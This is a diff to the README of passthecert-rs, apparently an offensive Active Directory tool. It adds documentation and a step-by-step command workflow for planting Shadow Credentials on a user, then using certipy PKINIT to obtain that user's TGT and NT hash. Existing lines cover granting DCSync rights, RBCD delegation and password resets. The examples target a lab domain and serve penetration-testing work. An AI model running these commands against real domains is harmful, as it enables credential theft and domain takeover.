@@ -6,6 +6,7 @@
 - [Getting a certificate](#getting-a-certificate)
 - [Transports (389 StartTLS vs 636 LDAPS)](#transports)
 - [Actions](#actions)
+  - [Shadow Credentials workflow](#shadow-credentials-workflow)
 - [Troubleshooting](#troubleshooting)
 
 <hr />
@@ -84,7 +85,7 @@ to `<conn>` = `-d essos.local -f meereen.essos.local --crt daenerys.crt --key da
 | Action | Example | Description |
 |---|---|---|
 | `whoami` | `passthecert-rs <conn> --action whoami` | Confirm the identity the DC mapped from the certificate (RFC 4532 Who am I?). |
-| `ldapshell` | `passthecert-rs <conn> --action ldapshell` | Interactive LDAP shell exposing every action (`whoami`, `search`, `add_member`, `elevate`, `write_rbcd`, `add_computer`, …). Type `help` inside. |
+| `ldapshell` | `passthecert-rs <conn> --action ldapshell` | Interactive LDAP shell exposing every action (`whoami`, `search`, `add_member`, `elevate`, `write_rbcd`, `add_computer`, `add_shadow_cred`, …). Type `help` inside. |
 | `add_computer` | `passthecert-rs <conn> --action add_computer --computer-name "EVIL$" --computer-pass "P@ssw0rd!"` | Create a machine account (name/password random if omitted). Uses the machine account quota. |
 | `del_computer` | `passthecert-rs <conn> --action del_computer --computer-name "EVIL$"` | Delete a machine account. |
 | `modify_user` | `passthecert-rs <conn> --action modify_user --target khal.drogo --new-pass "NewP@ss1"` | Reset a user's password (`unicodePwd`). Requires write access to the target. |
@@ -97,6 +98,10 @@ to `<conn>` = `-d essos.local -f meereen.essos.local --crt daenerys.crt --key da
 | `write_rbcd` | `passthecert-rs <conn> --action write_rbcd --delegate-to "MEEREEN$" --delegate-from "EVIL$"` | Allow `--delegate-from` to impersonate on `--delegate-to` via S4U2Proxy. |
 | `remove_rbcd` | `passthecert-rs <conn> --action remove_rbcd --delegate-to "MEEREEN$" --delegate-from "EVIL$"` | Remove one RBCD entry from the target. |
 | `flush_rbcd` | `passthecert-rs <conn> --action flush_rbcd --delegate-to "MEEREEN$"` | Clear all RBCD entries on the target. |
+| `add_shadow_cred` | `passthecert-rs <conn> --action add_shadow_cred --shadow-target viserys.targaryen` | Add a Key Credential to the target's `msDS-KeyCredentialLink` (Shadow Credentials / Key Trust). Generates an RSA 2048 key, saves `<target>.crt` + `<target>.key`, and prints the certipy command to obtain a TGT / NT hash via PKINIT. |
+| `list_shadow_cred` | `passthecert-rs <conn> --action list_shadow_cred --shadow-target viserys.targaryen` | List the Key Credentials on the target, showing each DeviceID (GUID) and creation time. |
+| `remove_shadow_cred` | `passthecert-rs <conn> --action remove_shadow_cred --shadow-target viserys.targaryen --shadow-key-id <DeviceID>` | Remove one Key Credential by DeviceID (from `list_shadow_cred`). |
+| `flush_shadow_cred` | `passthecert-rs <conn> --action flush_shadow_cred --shadow-target viserys.targaryen` | Clear all Key Credentials on the target. |
 | `rusthound_ce` | `passthecert-rs <conn> --action rusthound_ce` | Run a full RustHound-CE (BloodHound-CE) collection over the certificate session, into the current directory, zipped. |
 
 ## ldap-shell commands
@@ -104,27 +109,58 @@ to `<conn>` = `-d essos.local -f meereen.essos.local --crt daenerys.crt --key da
 `--action ldapshell` opens an interactive shell that runs the same actions
 against the authenticated session. Available commands:
 
-```
-whoami                          show the mapped identity
-search <baseDN> [filter]        subtree search, prints DNs
-dn <baseDN>                     search <baseDN> (objectClass=*)
-add_member <user> <group>      add user/computer to a group
-del_member <user> <group>      remove user/computer from a group
-enable <user>                   enable an account
-disable <user>                  disable an account
-passwd <user> [newpass]         reset a user's password
-elevate <user>                  grant DCSync rights
-add_computer [name$] [pass]     create a machine account
-del_computer <name$>            delete a machine account
-read_rbcd <target$>             list RBCD entries
-write_rbcd <target$> <from$>    allow from$ to impersonate on target$
-remove_rbcd <target$> <from$>   remove one RBCD entry
-flush_rbcd <target$>            clear all RBCD entries
-rusthound_ce                    run a full RustHound-CE collection (current dir, zipped)
-help | exit
+```bash
+  whoami                               show the mapped identity
+  search <baseDN> [filter]             subtree search, prints DNs
+  dn <baseDN>                          search <baseDN> (objectClass=*)
+  add_member <user> <group>            add user/computer to a group
+  del_member <user> <group>            remove user/computer from a group
+  enable <user>                        enable an account (clear ACCOUNTDISABLE)
+  disable <user>                       disable an account (set ACCOUNTDISABLE)
+  passwd <user> [newpass]              reset a user's password
+  elevate <user>                       grant the user DCSync rights
+  add_computer [name$] [pass]          create a machine account
+  del_computer <name$>                 delete a machine account
+  read_rbcd <target$>                  list RBCD entries on target
+  write_rbcd <target$> <from$>         allow from$ to impersonate on target$
+  remove_rbcd <target$> <from$>        remove one RBCD entry
+  flush_rbcd <target$>                 clear all RBCD entries
+  add_shadow_cred <target>             add Key Credential (saves .crt + .key)
+  list_shadow_cred <target>            list shadow credentials on target
+  remove_shadow_cred <target> <keyid>  remove one shadow credential by KeyID
+  flush_shadow_cred <target>           clear all shadow credentials on target
+  rusthound_ce                         run a full RustHound-CE collection (current dir, zipped)
+  help                                 this help
+  exit | quit                          leave
 ```
 
 <hr />
+
+
+## Shadow Credentials workflow
+
+```bash
+# 1. Plant the Key Credential (saves viserys.targaryen.crt + .key)
+passthecert-rs <conn> --action add_shadow_cred --shadow-target viserys.targaryen
+passthecert-rs <conn> --action list_shadow_cred --shadow-target viserys.targaryen
+
+# 2. Convert to PFX
+openssl pkcs12 -export -in viserys.targaryen.crt -inkey viserys.targaryen.key -out viserys.targaryen.pfx -passout pass:
+
+# 3. PKINIT -> TGT + NT hash
+certipy auth -pfx viserys.targaryen.pfx -dc-ip 192.168.56.12 -domain essos.local -username viserys.targaryen
+
+# 4. Clean up (the DC may already prune the key after the first PKINIT)
+passthecert-rs <conn> --action list_shadow_cred --shadow-target viserys.targaryen
+
+passthecert-rs <conn> --action remove_shadow_cred --shadow-target viserys.targaryen --shadow-key-id <DeviceID>
+```
+
+<p align="center">
+    <picture>
+        <img src="./img/demo-passthecert-rs_shadow_cred_action.gif" alt="passthecert-rs demo shadow credentials" />
+    </picture>
+</p>
 
 # Troubleshooting
 
